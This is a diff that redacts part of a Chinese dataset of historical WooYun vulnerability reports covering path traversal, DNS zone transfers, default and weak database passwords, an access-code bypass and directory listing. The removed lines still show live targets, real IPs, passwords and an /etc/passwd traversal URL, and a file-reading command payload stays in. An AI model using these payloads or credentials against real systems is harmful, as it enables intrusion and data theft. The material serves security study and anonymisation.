-**详情**: http://shop.xunlei.com/?controller=act&action=index&name=/../../../../../../../../../../../etc/passwd%00.html
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -29488,7 +29488,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 地址：http://monitor.aoshitang.com
+**详情**: 地址：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -29510,7 +29510,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 某日听说重庆时时彩,baidu搜了一下看到了gov.cn的域名,还以为是重庆官方办的.仔细察看了下,原来判断了来源页的内容.搜索关键字http://www.baidu.com/s?wd=%D6%D8%C7%EC%CA%B1%CA%B1%B2%CA&rsv_bp=0&rsv_spt=3&oq=chongqingshishica&rsp=0&f=3&inputT=3303当直接访问的时候出现的是正常页面
+**详情**: 某日听说重庆时时彩,baidu搜了一下看到了gov.cn的域名,还以为是重庆官方办的.仔细察看了下,原来判断了来源页的内容.搜索关键字https://example.com/[已脱敏]
 
 **POC**: 直接输入后
 
@@ -29554,7 +29554,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 中华人民共和国民政部DNS域传送漏洞：<code>dnsenum.pl VERSION:1.2-----   mca.gov.cn   ----------------------Host's addresses:-----------------mca.gov.cn.	3624	IN	A	116.193.41.39-------------Name servers:-------------ns1.mca.gov.cn.	3468	IN	A	116.193.41.39ns2.mca.gov.cn.	3495	IN	A	202.108.98.2localhost.	600	IN	A	127.0.0.1-----------MX record:-----------mail.mca.gov.cn.	3706	IN	A	202.108.98.60---------------------Try
+**详情**: 中华人民共和国民政部DNS域传送漏洞：<code>dnsenum.pl VERSION:1.2-----   mca.gov.cn   ----------------------Host's addresses:-----------------mca.gov.cn.	3624	IN	A	[IP已脱敏]-------------Name servers:-------------ns1.mca.gov.cn.	3468	IN	A	[IP已脱敏]ns2.mca.gov.cn.	3495	IN	A	[IP已脱敏]localhost.	600	IN	A	[IP已脱敏]-----------MX record:-----------mail.mca.gov.cn.	3706	IN	A	[IP已脱敏]---------------------Try
 
 **POC**: (见原文)
 
@@ -29578,7 +29578,7 @@
 
 **详情**: harbin.gov.cn
 
-**POC**: > ls harbin.gov.cn[dns.harbin.gov.cn]harbin.gov.cn.                 NS     server = dns.harbin.gov.cn#ajb                           A      61.158.105.83#by                            A      61.158.105.84#cdo                           A      61.158.105.97#du                            A      61.158.1
+**POC**: > ls harbin.gov.cn[dns.harbin.gov.cn]harbin.gov.cn.                 NS     server = dns.harbin.gov.cn#ajb                           A      [IP已脱敏]#by                            A      [IP已脱敏]#cdo                           A      [IP已脱敏]#du                            A      61.158.1
 
 **绕过**: 直接利用
 
@@ -29686,9 +29686,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://my.account.91.com/Include/Api/admin.php
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://my.account.91.com/Include/Api/admin.php
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -29696,8 +29696,8 @@
 ---
 
 ---
-### [wooyun-2012-08771] QQ空间情侣主页报错
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 应用配置错误
+### [wooyun-2012-08771] 某互联网公司空间情侣主页报错
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -29818,7 +29818,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 金山一路发nginx解析http://168.xoyo.com/images/help/u20.jpg/1.php
+**详情**: 金山一路发nginx解析https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -29842,16 +29842,16 @@
 
 **详情**: 盈捷万通 BridgeOS MongoDB 配置不当，密码明文存储，可以登录系统自带OA，查看用户信息、修改带宽等。这产品特性有亮点啊
 
-**POC**: 以长宽为例http://114.66.196.66/index.php你这星号把我逗的密码、用户信息啥的我就不截了，省的打码
+**POC**: 以长宽为例http://[IP已脱敏]
 
 **绕过**: 直接利用
 
-**修复**: 启用 auth 指定IP访问请参照 http://www.oschina.net/translate/10-tips-improve-mongodb
+**修复**: 启用 auth 指定IP访问请参照 https://example.com/[已脱敏]
 ---
 
 ---
-### [wooyun-2011-01977] 网易分站目录浏览
-**厂商**: 网易 | **年份**: 2011 | **类型**: 应用配置错误
+### [wooyun-2011-01977] 某互联网公司分站目录浏览
+**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -29862,9 +29862,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://apps.163.com/doc/skins/
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://apps.163.com/doc/skins/
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -29872,8 +29872,8 @@
 ---
 
 ---
-### [wooyun-2016-0189689] QQ手机版配置不当可再次强制聊天（以10001）为例
-**厂商**: 腾讯 | **年份**: 2016 | **类型**: 网络设计缺陷/逻辑错误
+### [wooyun-2016-0189689] 某互联网公司手机版配置不当可再次强制聊天（以10001）为例
+**厂商**: 某互联网公司 | **年份**: 2016 | **类型**: 网络设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -29884,9 +29884,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 今天打开我的iPhone发现上次报的WooYun: QQ iPhone版配置不当可强制聊天以10001为例竟然已经被修复了我不甘心啊，于是我打开我的iPod下载了一个QQ国际版发现没有什么用但我并没有就此放弃 我打开我的华为一个个试但我发现QQ安卓版和轻聊版均无法给不是好友的人点赞 但是突然人品爆发 发现QQ日本版没有去除这个功能 于是我立马给老马点赞（只要能点赞就成功了）
+**详情**: 今天打开我的iPhone发现上次报的WooYun: 某互联网公司 iPhone版配置不当可强制聊天以10001为例竟然已经被修复了我不甘心啊，于是我打开我的iPod下载了一个某互联网公司国际版发现没有什么用但我并没有就此放弃 我打开我的华为一个个试但我发现某互联网公司安卓版和轻聊版均无法给不是好友的人点赞 但是突然人品爆发 发现某互联网公司日本版没有去除这个功能 于是我立马给老马点赞（只要能点赞就成功了）
 
-**POC**: WooYun: QQ iPhone版配置不当可强制聊天以10001为例按照上一次的方法我们打开个人主页找到我赞过的人即可发信息就是这样
+**POC**: WooYun: 某互联网公司 iPhone版配置不当可强制聊天以10001为例按照上一次的方法我们打开个人主页找到我赞过的人即可发信息就是这样
 
 **绕过**: 直接利用
 
@@ -29894,8 +29894,8 @@
 ---
 
 ---
-### [wooyun-2014-049037] 百度加速乐某电信节点大量zebra路由默认口令!
-**厂商**: 百度 | **年份**: 2014 | **类型**: 系统/服务运维配置不当
+### [wooyun-2014-049037] 某搜索引擎加速乐某电信节点大量zebra路由默认口令!
+**厂商**: 某搜索引擎 | **年份**: 2014 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -29928,7 +29928,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 影响网站：http://yaoguobbs.duowan.commask 区域*****^^^*****1.http://**.**.**/dzvul/sodb/19/sodb-2010-01.txt
+**详情**: 影响网站：https://example.com/[已脱敏] 区域*****^^^*****1.http://**.**.**/dzvul/sodb/19/sodb-2010-01.txt
 
 **POC**: cmd=echo readfile('./config.inc.php');<?php/*[Discuz!] (C)2001-2006 Comsenz Inc.This is NOT a freeware, use is subject to license terms$RCSfile: config5.inc.php,v $$Revision: 1.1 $$Date: 2007/11/10 04:06:46 $*/// [CH] 以下变量请根据空间商提供的账号参数修改,如有疑问,请联系服务器提供商$dbhost = '10.20.**.**:6301';			// 数据库服务器$dbuser
 
@@ -29960,8 +29960,8 @@
 ---
 
 ---
-### [wooyun-2011-02697] 腾讯新闻站存在遍历目录漏洞
-**厂商**: 腾讯 | **年份**: 2011 | **类型**: 系统/服务运维配置不当
+### [wooyun-2011-02697] 某互联网公司新闻站存在遍历目录漏洞
+**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -29972,7 +29972,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 腾讯新闻站存在遍历目录漏洞,可查看2002~2011所有详细的新闻列表
+**详情**: 某互联网公司新闻站存在遍历目录漏洞,可查看2002~2011所有详细的新闻列表
 
 **POC**: (见原文)
 
@@ -29982,8 +29982,8 @@
 ---
 
 ---
-### [wooyun-2015-0122084] WEB接口安全之新浪微博加密提取码逻辑绕过案例
-**厂商**: 新浪微博 | **年份**: 2015 | **类型**: 应用配置错误
+### [wooyun-2015-0122084] WEB接口安全之某社交平台某社交平台加密提取码逻辑绕过案例
+**厂商**: 某社交平台某社交平台 | **年份**: 2015 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 参数注入
 
@@ -29994,9 +29994,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: inurl:http://vdisk.weibo.com/?access_code=其中?access_code参数就是提取码参数抓取它就行 ，1800条提取验证码随便一个打开http://vdisk.weibo.com/lc/nOiuvghIXwiDBQh3g?access_code=XJ35提取码自动验证成功其实你如果访问这段http://vdisk.weibo.com/lc/nOiuvghIXwiDBQh3g它会提示你输入提取码因为用户并没有公开http://vdisk.weibo.com/lc/nOiuvghIXwiDBQh3g当前提取码为XJ35输入看看成功进入http://vdisk.weibo.com/lc/i4jUfWOlJGfrqcDey     ?access_code=M80Hhttp://vdisk.weibo.com/lc/1xR3PoswO2NGdlJgW5v 
+**详情**: inurl:https://example.com/[已脱敏] ，1800条提取验证码随便一个打开https://example.com/[已脱敏]     ?access_code=M80Hhttps://example.com/[已脱敏] 
 
-**POC**: 单独访问http://vdisk.weibo.com/lc/nGxwuuR6hQQyUSNhA??access_code=1234提示需要输入提取码配偶提取码错误的提取码：我们随便定义一个  ?access_code=1234  错误的?access_code=WXK5http://vdisk.weibo.com/lc/nGxwuuR6hQQyUSNhA??access_code=1234随便输入1234错误是不行的正确的是WXK5
+**POC**: 单独访问https://example.com/[已脱敏]  ?access_code=1234  错误的?access_code=WXK5https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -30016,7 +30016,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://mail.zmja.com邮箱可注册。有密保举例说明。地址簿。部分员工电话泄露。根据地址簿邮箱进行密码找回。注册时的密保举例。得到密码。再来一个法律部。
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 如上。
 
@@ -30040,7 +30040,7 @@
 
 **详情**: 
 
-**POC**: // Decompiled by Jad v1.5.8g. Copyright 2001 Pavel Kouznetsov.// Jad home page: http://www.kpdus.com/jad.html// Decompiler options: packimports(3)// Source File Name:   DBManager.javapackage away.db;import java.sql.Connection;import java.sql.SQLException;import java.util.Hashtable;// Referenced clas
+**POC**: // Decompiled by Jad v1.5.8g. Copyright 2001 Pavel Kouznetsov.// Jad home page: https://example.com/[已脱敏] Decompiler options: packimports(3)// Source File Name:   DBManager.javapackage away.db;import java.sql.Connection;import java.sql.SQLException;import java.util.Hashtable;// Referenced clas
 
 **绕过**: 直接利用
 
@@ -30062,7 +30062,7 @@
 
 **详情**: 乐视网爆路径
 
-**POC**: http://my.letv.com/api/tianya/
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -30082,7 +30082,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 这应该属防爬虫配置的问题百度：site:zt-express.com  这是中通的内部办公系统共33条结果，直接访问发现访问不了，需要登录通过百度快照，可以看到文件的详细内容其它的也一样，这些文件对我来说没有什么，但对同行应该有些用吧。
+**详情**: 这应该属防爬虫配置的问题某搜索引擎：site:zt-express.com  这是中通的内部办公系统共33条结果，直接访问发现访问不了，需要登录通过某搜索引擎快照，可以看到文件的详细内容其它的也一样，这些文件对我来说没有什么，但对同行应该有些用吧。
 
 **POC**: (见原文)
 
@@ -30092,8 +30092,8 @@
 ---
 
 ---
-### [wooyun-2012-016372] 中国移动24小时自助服务终端 绕过
-**厂商**: 中国移动 | **年份**: 2012 | **类型**: 默认配置不当
+### [wooyun-2012-016372] 某运营商24小时自助服务终端 绕过
+**厂商**: 某运营商 | **年份**: 2012 | **类型**: 默认配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -30114,8 +30114,8 @@
 ---
 
 ---
-### [wooyun-2014-073140] 一种通过flash的方式获取访客QQ号
-**厂商**: 腾讯 | **年份**: 2014 | **类型**: 系统/服务运维配置不当
+### [wooyun-2014-073140] 一种通过flash的方式获取访客某互联网公司号
+**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 认证接口
 
@@ -30126,13 +30126,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://openapi.qzone.qq.com/crossdomain.xml原理参考 http://wooyun.org/bugs/wooyun-2014-062461POC: http://给.pw/getqq/IE10, Chrome36 测试均有效，浏览器内登录过QQ之后(从QQ打开QQ空间、邮箱等也行)访问该POC即可。
+**详情**: https://example.com/[已脱敏] https://example.com/[已脱敏] http://给.pw/get某互联网公司/IE10, Chrome36 测试均有效，浏览器内登录过某互联网公司之后(从某互联网公司打开某互联网公司空间、邮箱等也行)访问该POC即可。
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 参考:http://drops.wooyun.org/tips/2031http://drops.wooyun.org/tips/2554
+**修复**: 参考:https://example.com/[已脱敏]
 ---
 
 ---
@@ -30148,9 +30148,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: #0x01:文件遍历http://211.152.48.110:99/uploadfile/http://211.152.48.110:99/bin/http://211.152.48.110:99/images/
+**详情**: #0x01:文件遍历http://[IP已脱敏]
 
-**POC**: #0x02若口令-postgresSQL如何证明是你们服务器，请参考IP:http://211.152.48.110:8088/login.aspx@211.152.48.110:5432密码：123456
+**POC**: #0x02若口令-postgresSQL如何证明是你们服务器，请参考IP:http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -30170,7 +30170,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://testm.10jqka.com.cn/phpmyadmin账号root  密码10jqka数据库有点多  共122个我是好人  就不翻数据库了
+**详情**: https://example.com/[已脱敏]  密码10jqka数据库有点多  共122个我是好人  就不翻数据库了
 
 **POC**: 可执行命令 读取hosts
 
